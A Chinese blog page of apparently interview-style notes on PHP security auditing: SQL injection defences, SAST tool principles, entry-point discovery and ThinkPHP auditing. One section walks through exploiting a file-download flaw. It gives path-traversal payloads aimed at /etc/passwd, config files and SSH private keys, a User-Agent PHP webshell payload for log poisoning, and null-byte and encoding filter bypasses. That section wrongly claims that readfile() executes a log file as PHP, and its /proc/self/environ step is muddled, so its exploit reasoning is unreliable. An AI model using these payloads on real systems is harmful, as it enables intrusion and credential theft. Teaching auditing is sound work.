<h3 id="PHP-在做-SQL-注入防御时有哪些方法"><a href="#PHP-在做-SQL-注入防御时有哪些方法" class="headerlink" title="PHP 在做 SQL 注入防御时有哪些方法"></a>PHP 在做 SQL 注入防御时有哪些方法</h3><p><strong>1. 使用预处理语句</strong></p>
<p>这是防御 SQL 注入的<strong>首选方法</strong>，也是最安全、最推荐的方式。预处理语句将 SQL 代码与数据<strong>完全分离</strong>，数据库会先编译SQL 模板，然后再将用户数据作为参数绑定进去。这样，无论用户输入什么，数据都只会被当作值来处理，而不会被当作SQL 代码的一部分</p>
<ul>
<li><p><strong>PDO (PHP Data Objects)</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建PDO连接</span></span><br><span class="line"><span class="variable">$pdo</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;mysql:host=localhost;dbname=testdb&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 准备SQL语句模板，使用 ? 占位符</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 绑定参数，将用户输入作为值传递</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 获取结果</span></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br></pre></td></tr></table></figure>

<p>PDO 是现代 PHP 开发中处理数据库连接和查询的标准库，它支持多种数据库，并且提供了强大的预处理功能</p>
</li>
<li><p><strong>MySQLi</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建MySQLi连接</span></span><br><span class="line"><span class="variable">$mysqli</span> = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="string">&quot;localhost&quot;</span>, <span class="string">&quot;username&quot;</span>, <span class="string">&quot;password&quot;</span>, <span class="string">&quot;testdb&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. 准备SQL语句模板，使用 ? 占位符</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. 绑定参数，指定数据类型</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;s&quot;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]); <span class="comment">// &quot;s&quot; 表示 string</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 执行查询</span></span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. 获取结果</span></span><br><span class="line"><span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">get_result</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>();</span><br></pre></td></tr></table></figure>

<p>MySQLi 是专为 MySQL 设计的扩展，也支持预处理语句</p>
</li>
</ul>
<p><strong>2. 使用 ORM 框架</strong></p>
<p>如果你在使用像 <strong>Laravel</strong>、<strong>Symfony</strong> 或 <strong>Yii</strong> 这样的现代 PHP 框架，那么ORM（对象关系映射）库（如Eloquent或Doctrine）已经为你处理了预处理语句的复杂性</p>
<ul>
<li><p><strong>Laravel Eloquent 示例</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">App</span>\<span class="title">Models</span>\<span class="title">User</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Eloquent会自动使用预处理语句</span></span><br><span class="line"><span class="variable">$user</span> = <span class="title class_">User</span>::<span class="title function_ invoke__">where</span>(<span class="string">&#x27;username&#x27;</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>])-&gt;<span class="title function_ invoke__">first</span>();</span><br></pre></td></tr></table></figure>

<p>使用 ORM，你不再需要直接编写 SQL 语句，而是通过操作对象来完成数据库交互，这从根本上避免了 SQL 注入的可能性</p>
</li>
</ul>
<p><strong>3. 数据转义</strong></p>
<p>在某些老旧的系统或特殊情况下，如果无法使用预处理语句，你必须对所有用户输入进行<strong>转义</strong>。转义的目的是将用户输入中的特殊字符（如单引号 <code>&#39;</code>、双引号 <code>&quot;</code>、反斜杠 <code>\</code> 等）进行处理，使它们失去原有的特殊含义，被数据库当作普通字符串来处理</p>
<ul>
<li><p><strong>使用 <code>mysqli_real_escape_string()</code></strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在使用前确保已经建立了MySQLi连接</span></span><br><span class="line"><span class="variable">$username</span> = <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$conn</span>, <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 将转义后的变量拼接到SQL语句中</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users WHERE username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$conn</span>, <span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>

<p>这种方法<strong>只在最后一道防线</strong>使用，并且<strong>不推荐</strong>作为主要防御手段，因为它容易被遗漏，并且不同的数据库需要不同的转义函数，增加了开发者的负担</p>
</li>
<li><p><strong>注意</strong>：<strong>绝对不要再使用 <code>addslashes()</code></strong>，因为它无法处理所有字符集，容易被绕过。<code>mysql_escape_string()</code> 也已经被废弃</p>
</li>
</ul>
<p><strong>4. 最小权限原则</strong></p>
<p>这是一个重要的安全原则，可以降低 SQL 注入成功后的危害</p>
<ul>
<li><strong>不要使用 <code>root</code> 用户</strong>或拥有所有权限的用户来连接数据库</li>
<li>为应用程序<strong>创建专用的数据库用户</strong>，并只赋予它完成任务所需的最小权限。例如，一个只读操作的脚本，其数据库用户就应该只有 <code>SELECT</code> 权限</li>
</ul>
<table>
<thead>
<tr>
<th>防御方法</th>
<th>优点</th>
<th>缺点</th>
<th>推荐度</th>
</tr>
</thead>
<tbody><tr>
<td>预处理语句</td>
<td>最安全、最彻底的防御；将数据与代码分离；性能好。</td>
<td>语法相对复杂一些；无法用于某些动态 SQL（如表名、列名）。</td>
<td>最高</td>
</tr>
<tr>
<td>ORM 框架</td>
<td>从根本上杜绝 SQL 注入；开发效率高；代码可读性好。</td>
<td>需要学习框架；不适用于简单或无框架项目。</td>
<td>非常高</td>
</tr>
<tr>
<td>数据转义</td>
<td>适用于老旧系统或无框架的项目。</td>
<td>容易遗漏；依赖开发者记忆；不彻底。</td>
<td>低，仅作补充</td>
</tr>
<tr>
<td>最小权限</td>
<td>降低攻击后的危害。</td>
<td>无法从根本上防御注入。</td>
<td>非常高（作为安全原则）</td>
</tr>
</tbody></table>
<hr>
<h3 id="如果审计到了一个文件下载漏洞如何深入的去利用"><a href="#如果审计到了一个文件下载漏洞如何深入的去利用" class="headerlink" title="如果审计到了一个文件下载漏洞如何深入的去利用"></a>如果审计到了一个文件下载漏洞如何深入的去利用</h3><p><strong>1. 确认与初步利用</strong></p>
<p>首先，要确认这是一个真正的文件下载漏洞，而不是一个伪装的假象。通常，漏洞代码看起来是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;/var/www/html/downloads/&quot;</span> . <span class="variable">$file</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$path</span>)) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">readfile</span>(<span class="variable">$path</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not found.&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的关键在于 <code>$file = $_GET[&#39;file&#39;];</code> 这行代码没有对用户输入进行任何过滤</p>
<p><strong>初步利用方式：</strong></p>
<ul>
<li><strong>路径遍历（Path Traversal）：</strong> 尝试使用 <code>../</code> 来向上跳目录，下载服务器上的敏感文件<ul>
<li><strong>Payload:</strong> <code>?file=../../../../etc/passwd</code></li>
<li><strong>目的：</strong> 验证漏洞是否存在，并尝试下载系统敏感文件，如 <code>/etc/passwd</code>（Linux 用户列表）或 <code>C:\Windows\System32\drivers\etc\hosts</code>（Windows 主机文件）</li>
</ul>
</li>
<li><strong>下载源码：</strong> 尝试下载网站的 PHP 源代码文件。<ul>
<li><strong>Payload:</strong> <code>?file=../../../../var/www/html/index.php</code> 或 <code>?file=../../../../var/www/html/config.php</code></li>
<li><strong>目的：</strong> 获取网站的数据库连接信息、API密钥或其他硬编码的凭据，为下一步攻击做准备</li>
</ul>
</li>
</ul>
<p><strong>2. 深入利用：组合攻击</strong></p>
<p>如果仅仅是下载文件，漏洞的危害有限。但如果将它与其他漏洞或服务器配置问题结合起来，它的威力会成倍增加。</p>
<p><strong>场景一：与日志文件结合</strong></p>
<p>如果服务器的 Web 日志文件可以被下载，而你又可以向日志中写入数据，那么这个文件下载漏洞就可能变成一个<strong>远程代码执行</strong>漏洞</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li><strong>向日志中写入恶意 PHP 代码：</strong><ul>
<li>通常，Web 服务器（如 Apache）会记录用户的 User-Agent、Referer 等 HTTP 头信息</li>
<li>将你的 User-Agent 设置为包含恶意 PHP 代码，例如：<code>&lt;?php system(&#39;ls -al&#39;); ?&gt;</code></li>
<li><strong>Payload:</strong> <code>User-Agent: &lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;</code></li>
<li>通过访问一个不存在的页面来触发日志记录</li>
</ul>
</li>
<li><strong>利用文件下载漏洞下载并执行日志文件：</strong><ul>
<li>找到日志文件的路径。通常位于 <code>/var/log/apache2/access.log</code> 或 <code>/var/log/httpd/access_log</code></li>
<li><strong>Payload:</strong> <code>?file=../../../../var/log/apache2/access.log</code></li>
<li>当服务器执行 <code>readfile()</code> 函数时，它会将日志文件作为 PHP 代码来解析并执行</li>
<li><strong>执行命令：</strong> 你的浏览器现在会显示 <code>ls -al</code> 命令的输出</li>
</ul>
</li>
<li><strong>最终利用：</strong><ul>
<li>现在你可以通过在URL中添加 <code>&amp;cmd=...</code> 来执行任意命令</li>
<li><strong>Payload:</strong> <code>?file=../../../../var/log/apache2/access.log&amp;cmd=id</code></li>
<li>你可以通过这个方式上传一个WebShell，从而完全控制服务器</li>
</ul>
</li>
</ol>
<p><strong>场景二：与本地文件包含（LFI）漏洞结合</strong></p>
<p>如果目标服务器存在本地文件包含漏洞，但你不知道路径或无法直接利用，文件下载漏洞可以帮助你获取更多信息</p>
<p><strong>利用步骤：</strong></p>
<ol>
<li><strong>使用文件下载漏洞下载 PHPinfo 文件</strong><ul>
<li>找到服务器上的一个 <code>phpinfo()</code> 文件（如果有的话）</li>
<li><strong>Payload:</strong> <code>?file=../../../../var/www/html/info.php</code></li>
<li><strong>目的：</strong> <code>phpinfo()</code> 页面会暴露大量敏感信息，包括服务器的配置、环境变量、安装的模块等，这些信息可以帮助你找到新的攻击面</li>
</ul>
</li>
<li><strong>利用 LFI 漏洞包含敏感文件：</strong><ul>
<li>如果你发现了一个可以包含文件的漏洞，但是无法直接包含日志文件</li>
<li>你可以先利用文件下载漏洞，下载服务器上的<code>/proc/self/environ</code>文件。这个文件通常包含进程的环境变量，包括你之前设置的 User-Agent</li>
<li>然后，利用LFI漏洞去包含 <code>/proc/self/environ</code>，从而执行你注入到 User-Agent 中的代码</li>
</ul>
</li>
</ol>
<p><strong>3. 利用思路的扩展</strong></p>
<p>除了上述两种常见的组合攻击，你还可以尝试以下利用方式：</p>
<ul>
<li><p><strong>下载 SSH 密钥：</strong> 如果服务器启用了SSH，你可以尝试下载用户的 SSH 密钥</p>
<ul>
<li><strong>Payload:</strong> <code>?file=../../../../home/user/.ssh/id_rsa</code></li>
<li><strong>目的：</strong> 使用密钥直接登录服务器，获取 Shell 权限</li>
</ul>
</li>
<li><p><strong>下载数据库文件：</strong></p>
<ul>
<li>对于 SQLite 等数据库，其数据存储在文件中</li>
<li><strong>Payload:</strong> <code>?file=../../../../var/www/html/database/db.sqlite</code></li>
<li><strong>目的：</strong> 获取整个数据库的内容，包括用户密码（如果未加密）、个人信息等</li>
</ul>
</li>
<li><p><strong>绕过防御：</strong></p>
<ul>
<li>如果开发者对 <code>../</code> 进行了过滤，可以尝试双重编码 <code>..%252f</code> 或其他编码方式来绕过</li>
<li>如果路径是硬编码的，例如 <code>downloads/</code>，尝试使用空字节 <code>%00</code> 来截断路径</li>
<li><strong>Payload:</strong> <code>?file=../../../../etc/passwd%00</code></li>
</ul>
<hr>
<h3 id="讲讲-Fortity-等代码审计工具原理"><a href="#讲讲-Fortity-等代码审计工具原理" class="headerlink" title="讲讲 Fortity 等代码审计工具原理"></a>讲讲 Fortity 等代码审计工具原理</h3></li>
</ul>
<p><strong>Fortify 等代码审计工具的原理</strong></p>
<p>Fortify、Checkmarx、SonarQube 等自动化代码审计工具，其核心原理是<strong>静态应用安全测试（Static Application Security Testing, SAST）</strong>。它们不对程序进行实际运行，而是通过分析程序的<strong>源代码、字节码或二进制文件</strong>，来识别其中的安全漏洞</p>
<p>这就像一个医生在给病人看病时，不是通过观察病人的症状，而是直接通过分析病人的基因图谱来预测潜在的疾病风险。</p>
<p>这些工具的工作流程通常分为以下几个阶段：</p>
<ol>
<li><p><strong>解析（Parsing）</strong> 这是工具的第一步，也是最重要的一步。它会像编译器一样，对输入的源代码进行词法分析、语法分析和语义分析，将代码转换为一个更容易分析的中间表示，通常是<strong>抽象语法树（Abstract Syntax Tree, AST）</strong></p>
<ul>
<li><strong>目的</strong>：将代码的文本形式转换为结构化的数据，方便后续的分析</li>
</ul>
</li>
<li><p><strong>数据流分析（Data Flow Analysis）</strong> 这个阶段是 SAST 工具的核心。它会追踪程序中<strong>数据的流动路径</strong>，特别是从**外部输入源（Source）<strong>到</strong>敏感操作（Sink）**的路径</p>
<ul>
<li><strong>外部输入源（Source）</strong>：指那些可能被用户控制的输入，例如 HTTP 请求的参数（<code>$_GET</code>、<code>$_POST</code>）、文件上传、数据库查询结果等</li>
<li><strong>敏感操作（Sink）</strong>：指那些可能引发安全漏洞的操作，例如执行系统命令（<code>system()</code>）、执行 SQL 查询（<code>mysqli_query()</code>）、写入文件等</li>
<li><strong>分析过程</strong>：工具会模拟数据从 Source 流向 Sink 的过程。如果发现一个未经验证或过滤的外部输入直接进入了敏感操作，它就会标记为一个潜在的漏洞</li>
<li><strong>例如</strong>：当一个用户输入的 <code>$username</code> 直接被拼接到 SQL 查询语句中，工具就会识别出这是一个潜在的 SQL 注入漏洞</li>
</ul>
</li>
<li><p><strong>控制流分析（Control Flow Analysis）</strong> 这个阶段分析程序执行的<strong>所有可能的路径</strong>。它会构建一个<strong>控制流图（Control Flow Graph, CFG）</strong>，来模拟程序在不同条件分支（<code>if/else</code>、<code>for</code>、<code>while</code>）下的执行路径</p>
<ul>
<li><strong>目的</strong>：结合数据流分析，判断漏洞是否在<strong>可达的执行路径</strong>上。如果一个漏洞位于一个永远不会被执行到的代码块中，那么它就是一个假阳性</li>
<li><strong>例如</strong>：一个敏感操作被放在一个永远为 <code>false</code> 的 <code>if</code> 语句中，那么工具会识别出这个漏洞无法被触发</li>
</ul>
</li>
<li><p><strong>规则匹配（Rule Matching）</strong> Fortify 等工具内置了一个庞大的<strong>漏洞规则库</strong>，这些规则定义了各种已知的漏洞模式。在分析了数据流和控制流之后，工具会将分析结果与规则库进行匹配</p>
<ul>
<li><strong>规则库</strong>：包含了各种语言（Java、PHP、Python 等）的常见漏洞，例如命令注入、跨站脚本（XSS）、文件上传漏洞等</li>
<li><strong>匹配过程</strong>：如果一个数据流路径符合某个漏洞规则，工具就会生成一个漏洞报告</li>
</ul>
<hr>
<h3 id="常见入口函数怎么找"><a href="#常见入口函数怎么找" class="headerlink" title="常见入口函数怎么找"></a>常见入口函数怎么找</h3></li>
</ol>
<p><strong>1. 查找 Web 框架的路由文件</strong></p>
<p>如果你面对的是一个流行的 Web 框架（如 Laravel, Symfony, ThinkPHP, Yii），那么入口通常由框架定义</p>
<ul>
<li><strong>Laravel</strong>: 入口文件通常是 <code>public/index.php</code>。所有请求都会被这个文件处理，然后根据 <code>routes</code> 目录下的路由配置文件（如 <code>routes/web.php</code> 或 <code>routes/api.php</code>）分发给不同的控制器方法</li>
<li><strong>ThinkPHP</strong>: 入口文件同样是项目根目录下的 <code>public/index.php</code>，路由文件在 <code>route</code> 目录下</li>
<li><strong>WordPress</strong>: 入口文件是根目录下的 <code>index.php</code>。它会加载 <code>wp-load.php</code>，进而加载整个 WordPress 核心</li>
</ul>
<p><strong>2. 查找包含或加载其他文件的文件</strong></p>
<p>如果不是一个标准的框架，那么入口文件通常是一个包含或加载了许多其他文件的文件</p>
<ul>
<li><strong>关键词搜索</strong>: 在代码库中搜索 <code>require</code>, <code>include</code>, <code>require_once</code>, <code>include_once</code> 等关键词。通常，代码量最少且包含最多其他文件的那个文件，就是入口文件</li>
<li><strong>文件名猜测</strong>: 很多开发者会使用通用的文件名作为入口，例如 <code>index.php</code>, <code>main.php</code>, <code>bootstrap.php</code> 或 <code>init.php</code></li>
</ul>
<p><strong>示例:</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// index.php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;config/db.php&#x27;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;lib/auth.php&#x27;</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;views/header.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<p>在这个例子中，<code>index.php</code> 就是一个很明显的入口</p>
<p><strong>3. 查看 Web 服务器的配置</strong></p>
<p>对于一些特殊的配置，Web 服务器（如 Apache 或 Nginx）的配置文件会指定入口文件</p>
<ul>
<li><strong>Apache</strong>: 在 <code>.htaccess</code> 文件或 Apache 的主配置文件（如 <code>httpd.conf</code>）中查找 <code>DirectoryIndex</code> 或 <code>RewriteRule</code> 规则</li>
<li><strong>Nginx</strong>: 在 Nginx 的配置文件（通常在 <code>/etc/nginx/sites-available/</code> 或 <code>/etc/nginx/conf.d/</code>）中查找 <code>index</code> 指令或 <code>location</code> 块中的 <code>rewrite</code> 规则</li>
</ul>
<p><strong>示例（Nginx 配置）:</strong></p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">    <span class="comment"># 如果请求的文件不存在，则将请求重写到 index.php</span></span><br><span class="line">    <span class="attribute">try_files</span> <span class="variable">$uri</span> <span class="variable">$uri</span>/ /index.php?<span class="variable">$args</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这条规则明确指定了所有请求都会被转发到 <code>index.php</code></p>
<p><strong>4. 追踪用户输入</strong></p>
<p>更高级的分析方法是追踪用户输入</p>
<ul>
<li><strong>搜索超全局变量</strong>: 在代码库中搜索 <code>$_GET</code>, <code>$_POST</code>, <code>$_REQUEST</code>, <code>$_COOKIE</code>, <code>$_FILES</code> 等超全局变量。这些变量是用户输入的最直接来源</li>
<li><strong>回溯分析</strong>: 找到这些变量的使用点后，向上追溯调用链。例如，如果你看到一个函数 <code>process_input($_POST[&#39;data&#39;])</code>，你需要找到 <code>process_input</code> 函数是在哪里被调用的，直到找到程序的起点</li>
</ul>
<hr>
<h3 id="PHP-代码审计流程"><a href="#PHP-代码审计流程" class="headerlink" title="PHP 代码审计流程"></a>PHP 代码审计流程</h3><p><strong>1. 宏观分析与项目理解</strong></p>
<ul>
<li><strong>项目概况了解</strong>: 首先，你需要快速浏览整个代码库，了解项目的规模、所使用的框架（例如 Laravel, ThinkPHP, WordPress 等）、版本以及主要功能模块。这有助于你构建一个大致的威胁模型</li>
<li><strong>寻找入口点</strong>: 确定程序的入口文件（如 <code>index.php</code>）和主要路由配置。这是所有用户输入和请求的起点，也是你后续深入分析的起点</li>
<li><strong>识别关键功能</strong>: 重点关注那些与用户交互、文件操作、数据库查询、命令执行以及身份认证相关的模块，这些地方最容易出现漏洞</li>
</ul>
<p><strong>2. 自动化工具扫描</strong></p>
<ul>
<li><strong>静态分析（SAST）</strong>: 使用专门的静态代码分析工具对整个代码库进行扫描。这些工具可以快速地发现一些明显的、模式化的漏洞，例如 SQL 注入、XSS、命令注入等<ul>
<li><strong>常用工具</strong>:<ul>
<li><strong><code>PHPStan</code></strong>: 检查代码中的潜在错误和不规范之处</li>
<li><strong><code>SonarQube</code></strong>: 功能强大的代码质量管理平台，可以集成多种规则集</li>
<li><strong><code>RIPS</code></strong> (付费) 或 <strong><code>php-security-scanner</code></strong> (开源): 专注于 PHP 安全漏洞扫描</li>
</ul>
</li>
</ul>
</li>
<li><strong>动态分析（DAST）</strong>: 如果条件允许，在测试环境中部署代码，使用动态扫描工具（如 Burp Suite Pro, OWASP ZAP）模拟黑客行为进行测试。这可以发现那些只有在运行时才能触发的漏洞</li>
</ul>
<p><strong>3. 人工审计与深度分析</strong></p>
<p>人工审计是发现复杂和逻辑漏洞的关键步骤，它需要你结合自动化工具的报告进行深入分析</p>
<ul>
<li><strong>查找敏感函数</strong>: 重点关注那些可能导致危险操作的函数，回溯它们的调用链，看参数是否可控、是否进行了过滤。<ul>
<li><strong>命令执行</strong>: <code>exec()</code>, <code>shell_exec()</code>, <code>passthru()</code>, <code>system()</code></li>
<li><strong>文件操作</strong>: <code>file_get_contents()</code>, <code>file_put_contents()</code>, <code>include()</code>, <code>require()</code></li>
<li><strong>SQL 注入</strong>: <code>mysqli_query()</code>, <code>PDO::query()</code></li>
<li><strong>代码执行</strong>: <code>eval()</code>, <code>assert()</code>, <code>unserialize()</code></li>
<li><strong>重定向</strong>: <code>header(&#39;Location: ...&#39;)</code></li>
</ul>
</li>
</ul>
<p><strong>4. 漏洞确认与报告</strong></p>
<ul>
<li><p><strong>漏洞复现</strong>: 找到潜在漏洞后，你需要在本地或测试环境中复现它，确认其真实存在且可利用</p>
</li>
<li><p><strong>编写报告</strong>: 撰写详细的漏洞报告，包括：</p>
<ul>
<li><strong>漏洞描述</strong>: 漏洞的类型、影响范围和风险等级</li>
<li><strong>漏洞位置</strong>: 精确的代码文件和行号</li>
<li><strong>复现步骤</strong>: 详细的攻击步骤，帮助开发者理解和验证</li>
<li><strong>修复建议</strong>: 给出具体的代码修复方案</li>
</ul>
<hr>
</li>
</ul>
<h3 id="ThinkPHP-框架审计起来有什么不同"><a href="#ThinkPHP-框架审计起来有什么不同" class="headerlink" title="ThinkPHP 框架审计起来有什么不同"></a>ThinkPHP 框架审计起来有什么不同</h3><p><strong>1. 核心差异：文件结构与路由机制</strong></p>
<ul>
<li><strong>传统 PHP 代码</strong>:<ul>
<li><strong>文件结构</strong>: 通常比较随意，一个页面一个文件，或者通过 <code>include</code>&#x2F;<code>require</code> 组织</li>
<li><strong>入口点</strong>: 可能会有多个入口文件，例如 <code>index.php</code>、<code>login.php</code>、<code>upload.php</code> 等</li>
<li><strong>审计思路</strong>: 从每个入口文件开始，逐个跟踪用户输入，找到所有可能被利用的敏感函数，例如 <code>eval</code>、<code>system</code>、<code>include</code></li>
</ul>
</li>
<li><strong>ThinkPHP 框架</strong>:<ul>
<li><strong>文件结构</strong>: 严格遵循 MVC（模型-视图-控制器）架构，有固定的目录结构，如 <code>app</code>、<code>config</code>、<code>public</code>、<code>route</code> 等</li>
<li><strong>入口点</strong>: 通常只有一个统一的入口文件，<code>public/index.php</code>。所有请求都通过这个文件，然后由框架的路由系统进行分发</li>
<li><strong>审计思路</strong>: 重点分析<strong>路由文件</strong>（<code>route</code> 目录），理解请求如何被分发到哪个<strong>控制器</strong>的哪个<strong>方法</strong>。审计不再是线性的文件流，而是基于路由-控制器-模型-视图的调用链</li>
</ul>
</li>
</ul>
<p><strong>2. 安全机制与新漏洞点</strong></p>
<ul>
<li><strong>传统 PHP 代码</strong>:<ul>
<li><strong>安全机制</strong>: 几乎没有内置的安全机制，所有安全检查（如输入过滤、SQL 预处理）都需要开发者手动实现，非常依赖开发者的安全意识</li>
<li><strong>常见漏洞</strong>: 由于缺乏统一的过滤，SQL 注入、XSS、命令执行等漏洞非常普遍且容易发现</li>
</ul>
</li>
<li><strong>ThinkPHP 框架</strong>:<ul>
<li><strong>安全机制</strong>:<ul>
<li><strong>自动路由解析</strong>: 框架会根据 URL 自动将参数传入控制器方法，但若使用不当会产生漏洞</li>
<li><strong>SQL 预处理</strong>: 提供了 ORM（对象关系映射）和查询构造器，鼓励开发者使用参数化查询，从而有效防御 SQL 注入</li>
<li><strong>自动过滤</strong>: 在早期版本中（如 ThinkPHP 5.x），<code>Request</code> 对象会进行自动过滤，但若开发者使用 <code>get()</code>、<code>post()</code> 等函数而不做安全处理，仍可能存在风险</li>
<li><strong>跨站请求伪造（CSRF）防护</strong>: 内置了 CSRF Token 机制</li>
</ul>
</li>
<li><strong>新漏洞点</strong>:<ul>
<li><strong>路由解析漏洞</strong>: 早期版本曾出现因 URL 解析不当导致的代码执行漏洞</li>
<li><strong>SQL 注入</strong>: 尽管有 ORM，但若开发者仍使用原始的 <code>query()</code> 方法或拼接字符串，SQL 注入依然会存在</li>
<li><strong>文件包含</strong>: 尽管框架本身减少了 <code>include</code> 的使用，但若开发者在控制器中动态加载了用户可控的文件，仍可能导致文件包含漏洞</li>
<li><strong>远程命令执行（RCE）</strong>: 框架本身可能存在一些高危的 RCE 漏洞，如历史上的 <strong>ThinkPHP RCE 漏洞</strong>，这些是框架自身的问题，而非开发者代码问题。</li>
</ul>
</li>
</ul>
</li>
</ul>
<p><strong>3. 审计流程的差异</strong></p>
<ul>
<li><strong>审计传统 PHP 代码</strong>:<ul>
<li><strong>方法</strong>: 重点是“找”，即找到所有用户输入点和敏感函数</li>
<li><strong>关键</strong>: 逐个文件、逐个功能地进行黑盒或白盒测试</li>
</ul>
</li>
<li><strong>审计 ThinkPHP 框架代码</strong>:<ul>
<li><strong>方法</strong>: 重点是“理解和跟踪”</li>
<li><strong>关键</strong>:<ol>
<li><strong>理解路由</strong>: 从 <code>route</code> 文件开始，理解 URL 如何映射到控制器和方法</li>
<li><strong>跟踪参数</strong>: 找到控制器方法中使用了 <code>Request::get()</code>、<code>Request::post()</code> 或直接从参数列表接收用户输入的地方</li>
<li><strong>检查数据流</strong>: 跟踪这些用户输入是如何被使用，是否直接进入了数据库查询、文件操作或命令执行函数</li>
<li><strong>关注框架漏洞</strong>: 检查框架版本，看是否存在已知的框架级别漏洞</li>
<li><strong>ORM 审计</strong>: 检查 ORM 查询，看是否存在使用原始 SQL 语句的情况，或者在使用 <code>where</code>、<code>find</code> 等方法时，参数是否被正确处理</li>
</ol>
</li>
</ul>
</li>
</ul>
<hr>
<h3 id="PHP-原生的敏感函数有哪些"><a href="#PHP-原生的敏感函数有哪些" class="headerlink" title="PHP 原生的敏感函数有哪些"></a>PHP 原生的敏感函数有哪些</h3><p><strong>1. 代码执行 &#x2F; 命令执行</strong></p>
